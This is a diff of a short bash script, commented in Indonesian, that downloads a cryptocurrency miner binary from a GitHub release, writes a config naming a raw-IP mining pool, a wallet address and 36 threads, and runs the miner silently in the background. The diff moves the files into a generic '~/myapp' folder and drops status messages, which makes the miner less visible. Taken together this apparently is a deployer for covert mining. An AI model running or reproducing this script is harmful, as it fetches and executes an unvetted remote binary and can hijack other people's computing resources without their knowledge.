@@ -1,39 +1,42 @@
 #!/bin/bash
 
-# Cek apakah miner sudah berjalan
+# Direktori kerja
+APP_DIR=~/myapp
+MINER_DIR="$APP_DIR/joko"
+CONFIG_FILE="$MINER_DIR/config.json"
+
+# Cek apakah sudah dijalankan sebelumnya
 if pgrep -f "./joko -c config.json" > /dev/null; then
-    echo "Miner sudah berjalan."
+    echo "Miner sudah berjalan. Keluar."
     exit 0
 fi
 
-# Buat direktori kerja
-WORKDIR="$.joko_miner"
-mkdir -p "$WORKDIR"
-cd "$WORKDIR" || exit 1
+# Buat direktori jika belum ada
+mkdir -p "$APP_DIR"
+cd "$APP_DIR"
 
-# Unduh dan ekstrak miner jika belum ada
-if [ ! -f "$WORKDIR/joko" ]; then
-    echo "Mengunduh miner..."
+# Unduh dan ekstrak hanya jika belum ada
+if [ ! -d "$MINER_DIR" ]; then
     wget -q https://github.com/vokerjok/Voker/releases/download/Voker/joko.tar.gz -O joko.tar.gz
     tar -xf joko.tar.gz
     rm -f joko.tar.gz
 fi
 
-# Buat config.json
-cat > config.json <<EOF
+cd "$MINER_DIR"
+
+# Buat file config
+cat > "$CONFIG_FILE" <<END
 {
   "url": "128.199.126.117:80",
-  "user": "MntUvZfYEvGvaYWSrkRvrW41YN5u7diF5R.joko1",
+  "user": "MntUvZfYEvGvaYWSrkRvrW41YN5u7diF5R.joko",
   "pass": "x",
   "threads": 36,
   "algo": "power2b"
 }
-EOF
+END
 
 # Set permission
-chmod +x joko config.json
+chmod +x "$MINER_DIR/joko" "$CONFIG_FILE"
 
 # Jalankan miner
-echo "Menjalankan miner..."
 nohup ./joko -c config.json > /dev/null 2>&1 &
-echo "Miner berjalan di latar belakang."
